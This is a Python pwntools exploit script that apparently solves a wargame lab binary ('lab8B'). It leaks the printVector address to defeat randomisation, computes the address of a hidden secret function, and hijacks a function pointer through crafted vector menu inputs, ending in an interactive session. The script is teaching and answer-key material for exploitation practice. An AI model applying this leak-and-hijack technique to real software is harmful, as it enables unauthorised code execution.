from pwn import *

thisIsASecret = 0x800010a7
printVector = 0x800010e9
secret_offset = printVector - thisIsASecret
p = process(["/levels/lab08/lab8B"])
log.info(util.proc.pidof(p))
pause()

# Create first vector
p.sendline("1") # enter
p.sendline("1") # vec 1
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")

# Get address of printVector function
p.sendline("3")
p.recv()
p.sendline("1")
buf = p.recvuntil("\nchar")
leak = int(buf.split()[-2], 16)
log.info("Print func at 0x{:x}".format(leak))
new_secret = leak - secret_offset
log.info("Secret func at 0x{:x}".format(new_secret))

# Create second vector
p.sendline("1") # enter
p.sendline("2") # vec 2
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline(str(new_secret - 1))
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")

# Sum them
p.sendline("2")

# Store in faves a few times
p.sendline("4")
p.sendline("4")
p.sendline("4")
p.sendline("4")
p.sendline("4")

# Load 5th into v1
p.sendline("6")
p.sendline("4")
p.sendline("1")

# Print it
p.sendline("3")
p.sendline("1")

p.interactive()
